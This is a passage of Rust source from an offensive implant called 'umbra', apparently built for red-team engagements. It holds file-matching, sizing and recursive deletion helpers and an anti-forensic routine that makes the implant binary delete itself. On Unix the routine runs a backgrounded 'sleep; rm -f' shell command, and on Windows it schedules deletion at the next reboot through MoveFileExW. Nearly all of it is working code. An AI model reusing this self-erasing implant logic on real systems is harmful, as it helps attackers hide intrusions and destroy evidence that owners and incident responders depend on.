            .or_else(|_| std::env::var("TMPDIR"))
            .or_else(|_| std::env::var("TMP"))
            .unwrap_or_else(|_| "/tmp".to_string());
        out = out.replace("$TEMP", &base);
    }
    if out.contains("$SELF") {
        let exe = std::env::current_exe()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|_| ctx.agent_id.clone());
        out = out.replace("$SELF", &exe);
    }
    out
}

/// The journal of the engagement.
fn journal_path() -> PathBuf {
    home().join(".umbra").join("journal.state")
}

/// The files that match a pattern.
///
/// The pattern is a path with a `*` in the last part: the shell of the
/// implant is not a shell, and it does not need to be.  The `*` is the
/// only wildcard, and it matches any run of characters -- so a pattern
/// of `*umbra*` takes the files whose name carries the word, and not
/// the whole directory.
fn glob_matches(pattern: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let path = Path::new(pattern);
    let name = match path.file_name() {
        Some(name) => name.to_string_lossy().to_string(),
        None => return out,
    };
    if !name.contains('*') {
        if path.exists() {
            out.push(pattern.to_string());
        }
        return out;
    }
    let parent = match path.parent() {
        Some(parent) => parent.to_path_buf(),
        None => PathBuf::from("."),
    };
    let entries = match fs::read_dir(&parent) {
        Ok(entries) => entries,
        Err(_) => return out,
    };
    for entry in entries.flatten() {
        let file = entry.file_name().to_string_lossy().to_string();
        if wildcard_match(&file, &name) {
            out.push(entry.path().to_string_lossy().to_string());
        }
    }
    out.sort();
    out
}

/// Does the name match the pattern?
///
/// The `*` is the only wildcard: it matches any run of characters, and
/// the rest of the pattern has to be there.
fn wildcard_match(text: &str, pattern: &str) -> bool {
    let case = if cfg!(target_os = "windows") {
        text.to_lowercase()
    } else {
        text.to_string()
    };
    let pattern = if cfg!(target_os = "windows") {
        pattern.to_lowercase()
    } else {
        pattern.to_string()
    };
    let parts: Vec<&str> = pattern.split('*').collect();
    if parts.len() == 1 {
        return case == pattern;
    }
    let first = parts[0];
    let last = parts[parts.len() - 1];
    if !case.starts_with(first) || !case.ends_with(last) {
        return false;
    }
    if first.len() + last.len() > case.len() {
        return false;
    }
    let mut rest = &case[first.len()..case.len() - last.len()];
    for part in &parts[1..parts.len() - 1] {
        match rest.find(part) {
            Some(index) => rest = &rest[index + part.len()..],
            None => return false,
        }
    }
    true
}

/// The size of a file.
fn file_size(path: &Path) -> u64 {
    fs::metadata(path).map(|meta| meta.len()).unwrap_or(0)
}

/// The size of a directory.
fn dir_size(path: &Path) -> u64 {
    let mut total = 0u64;
    if let Ok(entries) = fs::read_dir(path) {
        for entry in entries.flatten() {
            let meta = entry.metadata().ok();
            match meta {
                Some(meta) if meta.is_dir() => total += dir_size(&entry.path()),
                Some(meta) => total += meta.len(),
                None => {}
            }
        }
    }
    total
}

/// Remove a file or a directory and everything under it.
fn remove_path(path: &Path) -> Result<(), String> {
    let meta = match fs::symlink_metadata(path) {
        Ok(meta) => meta,
        Err(e) => return Err(e.to_string()),
    };
    if meta.is_dir() {
        fs::remove_dir_all(path).map_err(|e| e.to_string())
    } else {
        fs::remove_file(path).map_err(|e| e.to_string())
    }
}

/// The time in milliseconds.
fn now_millis() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0)
}

/// The time of the journal, in the format of the reports.
fn format_time(millis: u128) -> String {
    let seconds = (millis / 1000) as i64;
    let days = seconds.div_euclid(86_400);
    let rest = seconds.rem_euclid(86_400);
    let (year, month, day) = civil_from_days(days);
    format!(
        "{:04}-{:02}-{:02}T{:02}:{:02}:{:02}Z",
        year,
        month,
        day,
        rest / 3600,
        (rest % 3600) / 60,
        rest % 60
    )
}

/// The calendar day of a number of days since the epoch.
fn civil_from_days(days: i64) -> (i64, u32, u32) {
    let shifted = days + 719_468;
    let era = if shifted >= 0 {
        shifted
    } else {
        shifted - 146_096
    } / 146_097;
    let day_of_era = (shifted - era * 146_097) as u64;
    let year_of_era =
        (day_of_era - day_of_era / 1460 + day_of_era / 36_524 - day_of_era / 146_096) / 365;
    let year = year_of_era as i64 + era * 400;
    let day_of_year = day_of_era - (365 * year_of_era + year_of_era / 4 - year_of_era / 100);
    let mp = (5 * day_of_year + 2) / 153;
    let day = (day_of_year - (153 * mp + 2) / 5 + 1) as u32;
    let month = if mp < 10 { mp + 3 } else { mp - 9 } as u32;
    (if month <= 2 { year + 1 } else { year }, month, day)
}

/// The deletion of the binary, in the way of the platform.
///
/// On windows the file of a running process cannot be deleted, so the
/// deletion is written into the list of the session manager and it
/// happens at the next boot; that list is in the registry of the
/// machine, so the rights of the administrator are needed.
#[cfg(windows)]
fn schedule_deletion(path: &Path) -> Result<String, String> {
    use std::os::windows::ffi::OsStrExt;
    let wide: Vec<u16> = path.as_os_str().encode_wide().chain(std::iter::once(0)).collect();
    unsafe {
        let ok = win32::MoveFileExW(wide.as_ptr(), std::ptr::null(), win32::MOVEFILE_DELAY_UNTIL_REBOOT);
        if ok == 0 {
            return Err("the deletion at the reboot was refused: the rights of the administrator are needed".to_string());
        }
    }
    Ok("the binary is deleted at the next reboot: a running file cannot be removed on windows".to_string())
}

/// The deletion of the binary, in the way of the platform.
///
/// The file is unlinked by a child that waits for the parent to end: a
/// running file cannot be removed either, but the child does it a
/// moment later.
#[cfg(not(windows))]
fn schedule_deletion(path: &Path) -> Result<String, String> {
    use std::process::{Command, Stdio};
    let target = path.to_string_lossy().to_string();
    let command = format!("(sleep 2; rm -f '{}') >/dev/null 2>&1 &", target.replace('\'', "'\\''"));
    Command::new("/bin/sh")
        .arg("-c")
        .arg(&command)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| e.to_string())?;
    Ok("the binary is removed a moment after the implant ends".to_string())
}

/// The API of the deletion at the reboot.
#[cfg(windows)]
mod win32 {
    pub type BOOL = i32;
    pub type DWORD = u32;

    #[link(name = "kernel32")]
    extern "system" {
        pub fn MoveFileExW(
            existing: *const u16,
            new: *const u16,
            flags: DWORD,
        ) -> BOOL;
    }

    pub const MOVEFILE_DELAY_UNTIL_REBOOT: DWORD = 0x4;
}
